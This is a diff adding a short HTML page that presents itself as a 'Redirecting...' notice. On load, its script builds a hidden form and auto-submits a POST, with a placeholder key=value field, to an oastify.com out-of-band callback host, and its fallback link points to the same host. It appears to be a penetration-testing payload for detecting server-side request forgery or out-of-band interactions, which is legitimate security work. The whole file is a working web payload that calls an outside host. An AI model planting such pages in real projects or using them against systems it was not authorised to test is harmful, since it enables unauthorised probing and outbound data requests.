@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        window.onload = function redirectToPost() {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://06450pp3d2c0p5y8pfbuwaga71ds1mpb.oastify.com"; // Target URL
+
+            // Add any necessary hidden fields
+            var hiddenField = document.createElement("input");
+            hiddenField.type = "hidden";
+            hiddenField.name = "key";
+            hiddenField.value = "value";
+            form.appendChild(hiddenField);
+
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+</head>
+<body>
+    If you are not redirected automatically, follow this <a href="https://06450pp3d2c0p5y8pfbuwaga71ds1mpb.oastify.com">link</a>.
+</body>
+</html>
